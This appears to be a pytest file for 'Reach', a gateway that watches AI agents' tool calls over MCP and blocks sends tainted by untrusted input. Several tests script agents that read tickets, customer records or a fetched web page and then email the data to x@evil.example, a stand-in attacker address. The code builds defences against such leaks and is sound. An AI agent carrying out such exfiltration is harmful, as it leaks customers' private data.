import asyncio
import json
from contextlib import AsyncExitStack

import pytest
from mcp.client.client import Client

from reach import queries as Q
from reach.db import connect
from reach.gateway import Gateway, build_server
from reach.mock_servers import build


@pytest.fixture
def g(tmp_path, monkeypatch):
    monkeypatch.setenv("REACH_OUTBOX", str(tmp_path / "outbox.jsonl"))
    g = connect("gw_test", path=str(tmp_path / "gw.db"))
    yield g
    g.delete()


def outbox(tmp_path):
    p = tmp_path / "outbox.jsonl"
    return [json.loads(x) for x in p.read_text().splitlines()] if p.exists() else []


def text(res):
    return res.content[0].text


def test_gateway_blocks_third_leg_over_real_mcp(g, tmp_path):
    ups = {k: build(k) for k in ("zendesk", "postgres", "gmail")}
    gw = Gateway(g, "support-bot", ups, task="t1")

    async def run():
        async with Client(build_server(gw)) as c:
            names = {t.name for t in (await c.list_tools()).tools}
            assert {"zendesk__get_ticket", "postgres__query", "gmail__send_email"} <= names
            r1 = await c.call_tool("zendesk__get_ticket", {"id": 4521})
            assert "Ticket #4521" in text(r1)
            await c.call_tool("postgres__query", {"sql": "select * from customers"})
            r3 = await c.call_tool("gmail__send_email", {"to": "x@evil.example", "subject": "s", "body": "b"})
            assert r3.is_error and "BLOCKED by Reach" in text(r3)

    asyncio.run(run())
    assert outbox(tmp_path) == []  # nothing left the sandbox
    calls = Q.ro(g, "MATCH (c:Call)-[:IN_TASK]->(:Task {id:'t1'}) RETURN c.seq AS s, c.verdict AS v ORDER BY s")
    assert [c["v"] for c in calls] == ["allowed", "allowed", "blocked"]


def test_gateway_allows_send_on_a_clean_task(g, tmp_path):
    ups = {k: build(k) for k in ("postgres", "gmail")}
    gw = Gateway(g, "report-bot", ups, task="clean")

    async def run():
        async with AsyncExitStack() as s:
            await gw.open(s)
            await gw.call("postgres__query", {"sql": "select 1"})
            r = await gw.call("gmail__send_email", {"to": "boss@acme.example", "subject": "s", "body": "b"})
            assert not r.is_error

    asyncio.run(run())
    assert len(outbox(tmp_path)) == 1


def test_taint_follows_handoff_between_gateways(g, tmp_path):
    """Two agents, two gateways, one task id: the second agent never read untrusted
    input itself, but the task did, so its send is blocked and the handoff is learned."""
    research = Gateway(g, "research-agent", {"browser": build("browser")}, task="x1")
    sales = Gateway(g, "sales-assistant", {"hubspot": build("hubspot"), "gmail": build("gmail")}, task="x1")

    async def run():
        async with AsyncExitStack() as s:
            await research.open(s)
            await sales.open(s)
            await research.call("browser__fetch", {"url": "https://acme-rival.example/pricing"})
            await sales.call("hubspot__search_crm_objects", {"query": "open deals"})
            r = await sales.call("gmail__send_email", {"to": "x@evil.example", "subject": "p", "body": "deals"})
            assert r.is_error and "browser.fetch" in text(r)
            assert r.structured_content["reach"]["path"]["untrusted"][2] == "research-agent"

    asyncio.run(run())
    assert outbox(tmp_path) == []
    d = Q.ro(g, "MATCH (:Agent {name:'research-agent'})-[d:DELEGATES_TO]->(:Agent {name:'sales-assistant'}) RETURN d.observed AS o")
    assert d == [{"o": True}]


def test_audit_mode_lets_it_through_but_logs(g, tmp_path):
    ups = {k: build(k) for k in ("zendesk", "gmail")}
    gw = Gateway(g, "support-bot", ups, task="a1", mode="audit")

    async def run():
        async with AsyncExitStack() as s:
            await gw.open(s)
            await gw.call("zendesk__get_ticket", {"id": 4521})  # ingests AND reads customer records
            r = await gw.call("gmail__send_email", {"to": "x@evil.example", "subject": "s", "body": "b"})
            assert not r.is_error

    asyncio.run(run())
    assert len(outbox(tmp_path)) == 1
    v = Q.ro(g, "MATCH (c:Call)-[:IN_TASK]->(:Task {id:'a1'}) RETURN c.verdict AS v ORDER BY c.seq")
    assert v[-1]["v"] == "audit-would-block"
